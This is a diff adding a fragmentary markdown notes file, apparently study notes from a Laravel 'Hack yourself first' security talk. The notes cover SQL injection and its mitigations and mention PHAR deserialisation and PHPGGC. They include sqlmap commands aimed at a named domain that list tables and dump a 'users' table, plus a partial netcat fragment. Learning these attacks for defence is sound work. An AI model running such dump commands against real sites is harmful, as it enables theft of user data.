@@ -1,0 +1,77 @@
+# Commands
+============================
+
+$sqlmap -u sraban.com?abcd=1 --dbms=mysql --batch
+$sqlmap -u sraban.com?abcd=1 --dbms=mysql -D laracon_amsterdam --tables
+$sqlmap -u sraban.com?abcd=1 --dbms=mysql -D laracon_amsterdam -T users --dump
+
+composer require laravel/ui
+artisan ui vue --auth
+
+
+
+
+# Thoughts
+============================
+OWAPS
+CSRF attacks
+XSRF attacks
+XSS attacks
+
+
+
+# Links
+============================
+https://www.youtube.com/watch?v=kKGGVGiq2y8
+
+
+
+# Fundamentals
+============================
+## Hack yourself first
+#SQL Injection -> malicious queries injected through http request 
+-> soln: Escaping and sanitizing inputs., 
+-> Only necessary rights should be given to users to connect the database., 
+-> Display minimal error information
+
+$sqlmap -u sraban.com?abcd=1 --dbms=mysql --batch
+$sqlmap -u sraban.com?abcd=1 --dbms=mysql -D laracon_amsterdam --tables
+$sqlmap -u sraban.com?abcd=1 --dbms=mysql -D laracon_amsterdam -T users --dump
+
+https://en.wikipedia.org/wiki/SQL_injection
+https://owasp.org/www-project-cheat-sheets/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
+https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#LineCommentAttacks
+https://medium.com/@dlpadmavathi.us/sql-injection-7d7d14f91a41
+
+#Object Injection -> 
+From PHAR Deserialisation to RemoteCode execution
+Object -> String -> Object
+https://pasteboard.co/IUKhoKk.png
+https://pasteboard.co/IUKjDCe.png
+PHPGGC
+laracon.pwn
+nc -w 
+Privilege Escalation
+-------
+Tools
+http://sqlmap.org/
+
+
+
+# Concepts in Program
+============================
+Cors Issues: https://pasteboard.co/ISVkoxs.png
+
+
+
+# Tips & Tricks
+============================
+
+
+
+
+# Programs 
+============================
+
+
+
